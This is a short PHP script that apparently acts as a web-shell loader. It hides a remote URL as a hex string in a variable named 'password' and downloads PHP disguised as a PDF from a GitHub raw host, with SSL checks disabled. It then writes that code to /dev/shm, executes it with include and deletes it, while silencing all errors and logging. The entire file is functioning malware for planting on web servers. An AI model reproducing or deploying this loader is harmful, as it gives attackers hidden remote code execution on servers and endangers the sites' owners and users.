<?php
error_reporting(0);
ini_set('display_errors', '0');
ini_set('log_errors', '0');

function geturlsinfo($url) {
    if (function_exists('curl_exec')) {
        $conn = curl_init($url);
        
        
        $opt1 = constant('CURLOPT_RETURNTRANSFER');
        $opt2 = constant('CURLOPT_FOLLOWLOCATION');
        $opt3 = constant('CURLOPT_USERAGENT');
        $opt4 = constant('CURLOPT_SSL_VERIFYPEER');
        $opt5 = constant('CURLOPT_SSL_VERIFYHOST');
        $opt6 = constant('CURLOPT_COOKIE');

        
        curl_setopt($conn, $opt1, 1);
        curl_setopt($conn, $opt2, 1);
        curl_setopt($conn, $opt3, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($conn, $opt4, 0);
        curl_setopt($conn, $opt5, 0);

        if (isset($_SESSION['java'])) {
            curl_setopt($conn, $opt6, $_SESSION['java']);
        }

        $url_get_contents_data = curl_exec($conn);
        curl_close($conn);
    } elseif (function_exists('file_get_contents')) {
        $url_get_contents_data = file_get_contents($url);
    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
        $handle = fopen($url, "r");
        $url_get_contents_data = stream_get_contents($handle);
        fclose($handle);
    } else {
        $url_get_contents_data = false;
    }
    return $url_get_contents_data;
}

// password defaultnya tbl

$password = '68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f416e6f6e726f636b732f30782f726566732f68656164732f6d61737465722f6d696e692e706466'; 
function hex2str($hex) {
    $str = '';
    for ($i = 0; $i < strlen($hex); $i += 2) {
        $str .= chr(hexdec(substr($hex, $i, 2)));
    }
    return $str;
}


function clean_old_temp_files() {
    $temp_files = glob('/dev/shm/prefix*');
    foreach ($temp_files as $file) {
        if (is_file($file)) {
            unlink($file);
        }
    }
}


clean_old_temp_files();

$url = hex2str($password);
$a = geturlsinfo($url);
$temporary_file = tempnam('/dev/shm', 'prefix');
file_put_contents($temporary_file, $a);
include $temporary_file;
unlink($temporary_file);
?>
